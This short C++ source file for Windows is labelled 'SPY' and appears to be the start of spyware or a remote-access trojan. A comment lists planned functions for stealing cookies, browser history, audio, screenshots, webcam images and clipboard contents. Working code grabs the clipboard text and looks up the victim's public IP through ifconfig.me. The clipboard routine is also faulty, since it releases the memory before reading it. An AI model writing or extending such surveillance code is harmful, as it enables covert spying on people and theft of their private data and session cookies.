/*
SPY:
grab cookies: return whatever
grab publicip: return string [ok]
grab history: return whatever (check jabor)
record audio
screenshot: return base64 (unless we can return a file, then get an API which screenshots and return the file)
webcam image: return base64, unless above, or whatever CV returns
clipboard: return string [ok]
*/

#include <iostream>
#include <winsock2.h>
#include <windows.h>

#include "request.hh"

#pragma once

std::string grab_clipboard() {
    if (!OpenClipboard(NULL)) {
        return "failed to open clipboard";
    }
    HANDLE clipboard_data_handle = GetClipboardData(CF_TEXT);
    char* clipboard_data = static_cast<char*>(GlobalLock(clipboard_data_handle));
    GlobalUnlock(clipboard_data_handle);
    CloseClipboard();
    return clipboard_data;
}

std::string grab_ip() {
    return get_request("http://ifconfig.me/ip");
}